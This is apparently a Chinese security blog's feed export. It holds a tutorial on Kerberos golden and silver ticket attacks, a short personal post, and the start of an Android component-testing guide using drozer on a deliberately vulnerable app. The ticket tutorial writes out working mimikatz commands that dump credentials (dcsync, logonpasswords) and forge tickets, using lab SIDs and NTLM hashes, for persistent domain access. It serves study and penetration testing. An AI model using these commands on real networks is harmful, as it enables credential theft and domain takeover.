data-caption="image-20230118125139516"><img src="/../images/domain/basics/image-20230118125139516.png" alt="image-20230118125139516"></a></p><h3 id="域组"><a href="#域组" class="headerlink" title="域组"></a>域组</h3><p>域组用于将用户账户、计算机账户和其他组收集到可管理的单元中，对组进行管理。</p><h2 id="七、域中的访问控制列表（ACL）"><a href="#七、域中的访问控制列表（ACL）" class="headerlink" title="七、域中的访问控制列表（ACL）"></a>七、域中的访问控制列表（ACL）</h2><p>访问控制列表（ACL）由一系列访问控制条目组成，用于定义安全对象的访问策略。</p><h2 id="八、参考"><a href="#八、参考" class="headerlink" title="八、参考"></a>八、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">书籍《域渗透攻防指南》</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 域渗透系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透系列-票据传递(Pass the Ticket)攻击</title>
      <link href="/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/4.png" data-caption="image-20230120123857565"><img src="/../images/domain/ptt/4.png" alt="image-20230120123857565"></a></p><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>票据传递攻击（Pass the Ticket），基于 Kerberos 认证的一种攻击方式，常用于获取域控权限后的持久化维持权限。其中分为<font color=#c3dbe8>黄金票据传递攻击</font>，利用前提是得到了域内 krbtgt 用户的 NTLM 哈希值或 AES-256 的值）和<font color=#c3dbe8>白银票据传递攻击</font>，利用的前提是得到了域内服务账号的 NTLM 哈希值或 AES-256 的值。</p><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos 基于票据的身份认证方式，并非密码认证。客户端想要访问服务端的某个应用必须通过 Kerberos 进行票据身份认证。其主要由客户端（Client）、服务端（Server）、提供认证服务的KDC（Key Distribution Center）三部分组成。具体 Kerberos 认证过程请参考文章<a href="https://www.freebuf.com/articles/web/341103.html">内网渗透学习–Kerberos认证</a></p><hr><h2 id="二、黄金票据（Golden-Ticket）传递攻击"><a href="#二、黄金票据（Golden-Ticket）传递攻击" class="headerlink" title="二、黄金票据（Golden Ticket）传递攻击"></a>二、黄金票据（Golden Ticket）传递攻击</h2><p>在 kerberos 认证过程中会生成一个<font color=#c3dbe8> ST服务票据 </font>，可用于访问应用服务器。<font color=#c3dbe8>域中用户的ST服务票据均由 krbtgt 用户的密码 Hash 来计算生成的</font>，krbtgt 账户的密码 hash 存储在域控制器上，因此我们需要获取域管理员权限，只要拿到了 krbtgt 密码 Hash 就可以随意伪造ST服务票据，进而使用ST服务票据访问域控制器，使用 krbtgt 用户 Hash 生成的票据被称为 黄金票据（Golden Ticket）。</p><h3 id="制作黄金票据条件"><a href="#制作黄金票据条件" class="headerlink" title="制作黄金票据条件"></a>制作黄金票据条件</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">域名</span><br><span class="line">域sid值</span><br><span class="line">需要伪造的域用户名</span><br><span class="line">krbtgt 账户哈希值或AES-256值</span><br></pre></td></tr></table></figure></div><h3 id="黄金票据传递攻击实践"><a href="#黄金票据传递攻击实践" class="headerlink" title="黄金票据传递攻击实践"></a>黄金票据传递攻击实践</h3><p>1、获取域管理员权限后，登录域控，查看是否存在 krbtgt 账号，尝试进行黄金票据传递攻击，实现权限持久化维持</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">net user krbtgt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120123857565.png" data-caption="image-20230120123857565"><img src="/../images/domain/ptt/image-20230120123857565.png" alt="image-20230120123857565"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120124116925.png" data-caption="image-20230120124116925"><img src="/../images/domain/ptt/image-20230120124116925.png" alt="image-20230120124116925"></a></p><p>2、查看域信息</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120125657793.png" data-caption="image-20230120125657793"><img src="/../images/domain/ptt/image-20230120125657793.png" alt="image-20230120125657793"></a></p><p>3、获取 krbtgt 账号的 SID 值和哈希值，利用 mimikatz 进行获取</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /domain:域名 /user:krbtgt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120130405535.png" data-caption="image-20230120130405535"><img src="/../images/domain/ptt/image-20230120130405535.png" alt="image-20230120130405535"></a></p><p>4、整合域控信息如下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-1359007890-1682372173-1631803504# SID值</span><br><span class="line">4a67f14d5cc4fa22618c8b609e832db6# Hash NTLM 值</span><br><span class="line">owa.redteam.red# 域主机名</span><br><span class="line">redteam.red# 域名</span><br></pre></td></tr></table></figure></div><br/><p>5、制作黄金票据，利用 mimikatz 进行制作，此操作在域内任一主机上普通权限即可，现转至其中一个域成员 SQLSERVER-2008 计算机上操作</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120131311827.png" data-caption="image-20230120131311827"><img src="/../images/domain/ptt/image-20230120131311827.png" alt="image-20230120131311827"></a></p><p>在制作票据前，先将票据清空，防止之前的票据对新作的票据产生影响</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135302687.png" data-caption="image-20230123135302687"><img src="/../images/domain/ptt/image-20230123135302687.png" alt="image-20230123135302687"></a></p><p>利用 mimikatz 生成黄金票据并导入</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:要伪造的域用户(一般填写域管理员) /domain:域名 /sid:域SID值 /krbtgt:krbtgt账户的hash值 /ptt</span><br><span class="line">kerberos::golden /user:administrator /domain:redteam.red /sid:S-1-5-21-1359007890-1682372173-1631803504 /krbtgt:4a67f14d5cc4fa22618c8b609e832db6 /ptt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135447067.png" data-caption="image-20230123135447067"><img src="/../images/domain/ptt/image-20230123135447067.png" alt="image-20230123135447067"></a></p><p>查看票据是否已经生成导入</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135528127.png" data-caption="image-20230123135528127"><img src="/../images/domain/ptt/image-20230123135528127.png" alt="image-20230123135528127"></a></p><p>6、在导入票据的域内机器上，重新打开cmd窗口，直接列出域控目录</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\域控主机名.域名\c$</span><br></pre></td></tr></table></figure></div><p>黄金票据攻击前</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123142243785.png" data-caption="image-20230123142243785"><img src="/../images/domain/ptt/image-20230123142243785.png" alt="image-20230123142243785"></a></p><p>黄金票据攻击后</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135725487.png" data-caption="image-20230123135725487"><img src="/../images/domain/ptt/image-20230123135725487.png" alt="image-20230123135725487"></a></p><p>将域控主机 owa 的 c 盘映射到本地的 k 盘</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use k: \\域控主机名.域名\c$</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123140050974.png" data-caption="image-20230123140050974"><img src="/../images/domain/ptt/image-20230123140050974.png" alt="image-20230123140050974"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123140230369.png" data-caption="image-20230123140230369"><img src="/../images/domain/ptt/image-20230123140230369.png" alt="image-20230123140230369"></a></p><hr><h2 id="三、白银票据-Silver-Ticket-传递攻击"><a href="#三、白银票据-Silver-Ticket-传递攻击" class="headerlink" title="三、白银票据(Silver Ticket)传递攻击"></a>三、白银票据(Silver Ticket)传递攻击</h2><p>白银票据的利用过程是伪造 TGS，通过已知的授权服务密码（hash）生成一张可以访问该服务的TGT。即通过获取相应的服务账号的 hash 来伪造 TGS 给我们自己签发任意用户的 TGS 票据（service ticket），例如：LDAP、MSSQL、WinRM、DNS、CIFS等，范围有限，只能获取对应服务的权限，这个票据也被称为白银票据（Silver Ticket）。</p><h3 id="制作白银票据条件"><a href="#制作白银票据条件" class="headerlink" title="制作白银票据条件"></a>制作白银票据条件</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域名</span><br><span class="line">域SID值</span><br><span class="line">需要伪造的域用户（一般填写域管理员账号）</span><br><span class="line">可利用的服务</span><br><span class="line">服务账号的NTLM Hash值</span><br></pre></td></tr></table></figure></div><h3 id="白银票据传递攻击实践"><a href="#白银票据传递攻击实践" class="headerlink" title="白银票据传递攻击实践"></a>白银票据传递攻击实践</h3><p>白银票据伪造 CIFS 服务权限，CIFS 服务通常用于 Windows 主机之间的文件共享。</p><p>1、查看域信息</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123185504423.png" data-caption="image-20230123185504423"><img src="/../images/domain/ptt/image-20230123185504423.png" alt="image-20230123185504423"></a></p><p>2、获取域SID值和服务账号的 NTLM Hash</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123185650392.png" data-caption="image-20230123185650392"><img src="/../images/domain/ptt/image-20230123185650392.png" alt="image-20230123185650392"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123185946330.png" data-caption="image-20230123185946330"><img src="/../images/domain/ptt/image-20230123185946330.png" alt="image-20230123185946330"></a></p><p>4、整合域控信息如下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">189988620695f11d6c9a91da29eda1f8# NTLM HASH</span><br><span class="line">S-1-5-21-1359007890-1682372173-1631803504# SID 值</span><br><span class="line">owa.redteam.red# 主机名</span><br><span class="line">redteam.red# 域名</span><br></pre></td></tr></table></figure></div><br/><p>5、制作白银票据，利用 mimikatz 在域内成员主机上进行操作</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLMHash&gt; /user:&lt;伪造的用户名&gt; /ptt</span><br><span class="line">kerberos::golden /domain:redteam.red /sid:S-1-5-21-1359007890-1682372173-1631803504  /target:owa.redteam.red /rc4:189988620695f11d6c9a91da29eda1f8  /service:cifs /user:admin /ptt</span><br></pre></td></tr></table></figure></div><p>白银票据伪造 CIFS 服务攻击前</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123191308558.png" data-caption="image-20230123191308558"><img src="/../images/domain/ptt/image-20230123191308558.png" alt="image-20230123191308558"></a></p><p>白银票据伪造 CIFS 服务攻击后</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123191525936.png" data-caption="image-20230123191525936"><img src="/../images/domain/ptt/image-20230123191525936.png" alt="image-20230123191525936"></a></p><hr><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>黄金票据传递攻击与白银票据传递攻击两者区别在于</p><p>访问权限</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黄金票据：伪造TGT，可以获取任何Kerberos服务权限</span><br><span class="line">白银票据：伪造TGS，只能访问指定的服务</span><br></pre></td></tr></table></figure></div><p>加密方式</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黄金票据由 krbtgt 的 Hash 加密</span><br><span class="line">白银票据由服务账号（通常为计算机账户）Hash加密</span><br></pre></td></tr></table></figure></div><p>隐蔽性</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</span><br><span class="line">白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽</span><br></pre></td></tr></table></figure></div><hr><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/341103.html</span><br><span class="line">https://mp.weixin.qq.com/s/g-FEUXISYarj7ksYVxWCtg</span><br><span class="line">https://blog.csdn.net/zzgslh/article/details/106896431</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 域渗透系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 票据传递攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小站杂货店-你期待的，正在路上</title>
      <link href="/2023/01/22/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E4%BD%A0%E6%9C%9F%E5%BE%85%E7%9A%84%EF%BC%8C%E6%AD%A3%E5%9C%A8%E8%B7%AF%E4%B8%8A/"/>
      <url>/2023/01/22/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E4%BD%A0%E6%9C%9F%E5%BE%85%E7%9A%84%EF%BC%8C%E6%AD%A3%E5%9C%A8%E8%B7%AF%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/private/enjoy_your_life.jpg" data-caption="Enjoy_Your_Life"><img src="/../images/private/enjoy_your_life.jpg" alt="Enjoy_Your_Life"></a></p><h2 id="你期待的，正在路上"><a href="#你期待的，正在路上" class="headerlink" title="你期待的，正在路上"></a>你期待的，正在路上</h2><p>生活就像一盒巧克力，你永远不知道下一颗是什么味道。珍惜当下，感受生活，追求热爱。尝试释怀，重新出发。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 小站杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP测试系列-四大组件安全测试</title>
      <link href="/2022/12/28/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/12/28/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230164849744.png" data-caption="image-20221230164849744"><img src="/../images/app/Components/image-20221230164849744.png" alt="image-20221230164849744"></a></p><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>之前的文章介绍了 APP 抓包的几种方法，解决了抓包问题，其余 APP 功能点测试与 WEB 端测试如出一辙。本文主要介绍 Android APP 测试中四大组件相关测试手段。<br><br/></p><h3 id="Android-四大组件"><a href="#Android-四大组件" class="headerlink" title="Android 四大组件"></a>Android 四大组件</h3><p>Android 四大组件分别是 Activity、Content Provider、Broadcast Receiver 以及 Service</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| 组件名称            | 具体用途                                                     |</span><br><span class="line">| -----------------  | ------------------------------------------------------------ |</span><br><span class="line">| Activity           | 展示组件，用于向用户直接展示一个界面，而且可以接受用户的输入信息从而进行交互 |</span><br><span class="line">| Broadcast Receiver | 通讯组件，用于在不同组件甚至不同应用中传递消息               |</span><br><span class="line">| Content Provider   | 数据共享组件，用于向其他组件乃至其他应用共享数据             |</span><br><span class="line">| Service            | 能在后台执行长期运行操作的组件，它没有UI界面，运行在宿主进程的主线程中，因此执行耗时的后台计算任务需要在单独的线程中去完成 |</span><br></pre></td></tr></table></figure></div><br/><hr><h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><h3 id="drozer-安装"><a href="#drozer-安装" class="headerlink" title="drozer 安装"></a>drozer 安装</h3><p>drozer 安装在 Windows 下，安装环境必须为 python 2.7，下载地址 <a href="https://github.com/WithSecureLabs/drozer/releases/tag/2.4.4">Github</a>、<a href="https://labs.withsecure.com/tools/drozer">官网</a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116102905092.png" data-caption="image-20221116102905092"><img src="/../images/app/Components/image-20221116102905092.png" alt="image-20221116102905092"></a></p><p>1、安装 drozer 前先安装 python 2.7，安装时选择自动添加环境变量</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116195702257.png" data-caption="image-20221116195702257"><img src="/../images/app/Components/image-20221116195702257.png" alt="image-20221116195702257"></a></p><p>安装完成，测试是否成功安装</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116195828270.png" data-caption="image-20221116195828270"><img src="/../images/app/Components/image-20221116195828270.png" alt="image-20221116195828270"></a></p><p>2、安装 dorzer ，下载 <a href="https://github.com/mwrlabs/drozer/releases/download/2.4.4/drozer-2.4.4.win32.msi">drozer</a> 后点击安装，由于系统没有识别到 Python2.7，所以我们需要指定 python2.7 路径，若系统能识别到，则选择 python2.7 即可</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116200101626.png" data-caption="image-20221116200101626"><img src="/../images/app/Components/image-20221116200101626.png" alt="image-20221116200101626"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116200255960.png" data-caption="image-20221116200255960"><img src="/../images/app/Components/image-20221116200255960.png" alt="image-20221116200255960"></a></p><p>drozer 成功安装后，软件位于 Python 2.7 下的 Scripts 目录下</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221117205713220.png" data-caption="image-20221117205713220"><img src="/../images/app/Components/image-20221117205713220.png" alt="image-20221117205713220"></a></p><p>3、手机安装 <code>drozer-agent-2.3.4.apk</code>，<a href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">点击下载</a> 安装完成后，测试是否可正常使用。首先进入 dorzer-agent app 点击右下按钮，开启端口转发功能。然后使用<code>具备数据传输的 USB 线</code>，手机连接电脑，点击文件传输使电脑可连接至手机</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228201311642.png" data-caption="image-20221228201311642"><img src="/../images/app/Components/image-20221228201311642.png" alt="image-20221228201311642"></a></p><p>使用 adb 软件进行端口转发，使手机与电脑可进行通信，命令：<code>adb forward tcp:31415 tcp:31415</code> <a href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn">点击下载adb</a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221123144712299.png" data-caption="image-20221123144712299"><img src="/../images/app/Components/image-20221123144712299.png" alt="image-20221123144712299"></a></p><p>注意：当使用 adb 进行端口转发，若出现报错，<code>error: no devices/emulators found</code>，原因是我们手机没有开启开发者模式，只需打开手机开发者模式,开启  USB 调试功能，根据自身手机品牌自行进行操作，开启后再次再次执行命令 <code>adb.exe forward tcp:31415 tcp:31415</code> 即可。</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116204352994.png" data-caption="image-20221116204352994"><img src="/../images/app/Components/image-20221116204352994.png" alt="image-20221116204352994"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221117112228564.png" data-caption="image-20221117112228564"><img src="/../images/app/Components/image-20221117112228564.png" alt="image-20221117112228564"></a></p><p>最后进入 Python27\Scripts 目录下执行命令开启 drozer 与手机连接通道 <code>drozer.bat console connect</code>，如果报错 <code>ImportError: No module named google.protobuf</code>，则需要安装依赖。</p><p> <a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116205442505.png" data-caption="image-20221116205442505"><img src="/../images/app/Components/image-20221116205442505.png" alt="image-20221116205442505"></a></p><p>cmd 命令行执行逐一安装即可</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip2 install protobuf -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip2 install pyopenssl -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip2 install pyyaml -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip2 install twisted -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip2 install service_identity -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div><p>安装依赖后再次执行命令 <code>drozer.bat console connect</code>，drozer 成功连接手机，drozer 启动成功</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116210214044.png" data-caption="image-20221116210214044"><img src="/../images/app/Components/image-20221116210214044.png" alt="image-20221116210214044"></a></p><p>至此 drozer 安装及测试已全部完成。</p><hr><h2 id="三、四大组件测试"><a href="#三、四大组件测试" class="headerlink" title="三、四大组件测试"></a>三、四大组件测试</h2><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p>由上面我们知道 Activity 为展示组件，用于向用户直接展示一个界面，而且可以接受用户的输入信息从而进行交互。具体漏洞类型及危害如下：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| 漏洞种类                  | 危害                                                         |</span><br><span class="line">| -------------------------| ------------------------------------------------------------ |</span><br><span class="line">| 越权绕过                   | Activity用户界面绕过会造成用户信息窃取                         |</span><br><span class="line">| 拒绝服务                   | 通过Intent给Activity传输畸形数据使得程序崩溃从而影响用户体验    |</span><br><span class="line">| 钓鱼欺骗/Activity劫持       | 组件导出导致钓鱼欺诈，Activity界面被劫持产生欺诈等安全事件      |</span><br><span class="line">| 隐式启动intent包含敏感数据   | 敏感信息泄露                                                 |</span><br></pre></td></tr></table></figure></div><br/><h4 id="越权绕过"><a href="#越权绕过" class="headerlink" title="越权绕过"></a><font color=#ffffff>越权绕过</font></h4><p>在 Android 系统中，Activity 组件默认是不导出的，如果 <code>AndroidManifest.xml</code> 中设置了 <code>exported = &quot;true&quot;</code> 这样的关键值或者是添加了<code>&lt;intent-filter&gt;</code> 这样的属性，那么此时 Activity 组件是导出的，就会引发越权绕过或者是泄露敏感信息等的安全风险。<strong>（注释:导出-组件可以被外部应用调用; AndroidManifest.xml-应用清单，每个Android APP必备的文件配置，反编译后可查看其详细配置代码）</strong></p><p>例子:测试样本 sieve.apk，下载地址：<a href="https://github.com/as0ler/Android-Examples">https://github.com/as0ler/Android-Examples</a></p><p>1、手机安装 sieve.apk、drozer-agent.apk，sieve app 界面如下图左，按照上面文章 drozer 安装部分，配置好相关测试环境，手机端点击 drozer 右下角打开代理，利用 adb 进行端口转发，界面如下图右</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230154124250.png" data-caption="image-20221230154124250"><img src="/../images/app/Components/image-20221230154124250.png" alt="image-20221230154124250"></a></p><p>adb开启端口转发：<code>adb.exe forward tcp:31415 tcp:31415</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230150431447.png" data-caption="image-20221230150431447"><img src="/../images/app/Components/image-20221230150431447.png" alt="image-20221230150431447"></a></p><p>drozer 连接手机：<code>drozer.bat console connect</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118205504976.png" data-caption="image-20221118205504976"><img src="/../images/app/Components/image-20221118205504976.png" alt="image-20221118205504976"></a></p><p>2、尝试利用 drozer 越权绕过 sieve app 登录界面</p><p>列出手机程序中所有的 APP 包名</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230151306269.png" data-caption="image-20221230151306269"><img src="/../images/app/Components/image-20221230151306269.png" alt="image-20221230151306269"></a></p><p>如上图出现文字乱码，解决方案如下：</p><p>Everything 搜索，找到位于 Python27 目录下的 <code>package.py</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118211507281.png" data-caption="image-20221118211507281"><img src="/../images/app/Components/image-20221118211507281.png" alt="image-20221118211507281"></a></p><p>添加如下代码</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118211715083.png" data-caption="image-20221118211715083"><img src="/../images/app/Components/image-20221118211715083.png" alt="image-20221118211715083"></a></p><p>360、362行添加字母 u</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221118211856113.png" data-caption="image-20221118211856113"><img src="/../images/app/Components/image-20221118211856113.png" alt="image-20221118211856113"></a></p><p>重新启动 drozer，再次执行命令 <code>run app.package.list</code> 列出所有手机已安装程序的包名</p><p><a data-fancybox="gallery" 